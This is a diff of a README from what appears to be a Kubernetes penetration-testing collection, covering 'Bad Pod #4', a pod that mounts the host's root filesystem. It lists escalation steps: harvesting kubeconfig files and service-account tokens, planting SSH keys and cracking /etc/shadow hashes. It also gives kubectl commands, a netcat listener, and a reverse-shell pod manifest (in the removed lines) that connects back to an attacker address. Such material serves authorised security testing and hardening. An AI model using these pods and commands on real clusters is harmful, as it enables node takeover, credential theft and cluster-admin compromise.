@@ -1,89 +1,40 @@
+# Bad Pod #4: Unrestricted hostPath 
 # You can create a pod with only a hostpath mount, but it is unrestricted 
-If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 
+In this case, even if you don’t have access to host’s process or network namespaces, if the administrators have not limited what you can mount, you can mount / on the host into your pod, giving you read/write on the host’s filesystem. This allows you to execute most of the same privilege escalation paths outlined above. There are so many paths available that Ian Coldwater and Duffie Cooley gave an awesome Blackhat 2019 talk about it titled The Path Less Traveled: Abusing Kubernetes Defaults! 
+
+Here are some privileged escalation paths that apply anytime you have access to a Kubernetes node’s filesystem:
+* Look for `kubeconfig` files on the host filesystem – If you are lucky, you will find a cluster-admin config with full access to everything.
+* Access the tokens from all pods on the node - Use something like access-matrix to see if any of the pods have tokens that give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system 
+* Add your SSH key – If you have network access to SSH to the node, you can add your public key to the node and SSH to it for full interactive access
+* Crack hashed passwords – Crack hashes in `/etc/shadow`, see if you can use them to access other nodes
+
 
 # Pod Creation
-
-### Create a pod you can exec into
-
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-hostpath
-  labels:
-    app: pentest
-spec:
-  containers:
-  - name: hostpath
-    image: busybox
-    volumeMounts:
-    - mountPath: /host
-      name: noderoot
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "while true; do sleep 30; done;" ]
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  volumes:
-  - name: noderoot
-    hostPath:
-      path: /
-```
-[hostpath-exec.yaml](hostpath-exec.yaml)
-
-#### Option 1: Create pod from local yaml 
+## Create a pod you can exec into
+Create pod
 ```bash
-kubectl apply -f hostpath-exec.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml 
 ```
-
-#### Option 2: Create pod from github hosted yaml
+Exec into pod 
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpath/hostpath-exec.yaml  
+kubectl exec -it hostpath-exec-pod -- bash
 ```
 
-#### Exec into pod 
-```bash
-kubectl -n [namespace] exec -it pod-hostpath -- chroot /host
-```
+## Reverse shell pod
 
-### Or, create a reverse shell pod
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-hostpath-revshell
-  labels:
-    app: pentest
-spec:
-  containers:
-  - name: hostpath-revshell
-    image: busybox
-    volumeMounts:
-    - mountPath: /host
-      name: noderoot
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
-  restartPolicy: Always
-  volumes:
-  - name: noderoot
-    hostPath:
-      path: /
-```
-[hostpath-exec.yaml-revshell.yaml](hostpath-exec.yaml-revshell.yaml)
-
-#### Set up listener
+Set up listener
 ```bash
 nc -nvlp 3116
 ```
 
-#### Create the pod
+Create pod from local manifest without modifying it by using env variables and envsubst
 ```bash
-# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostpath/hostpath-exec.yaml-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell and chroot to /host 
+Catch the shell
 ```bash
-~ nc -nvlp 3116
+$ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
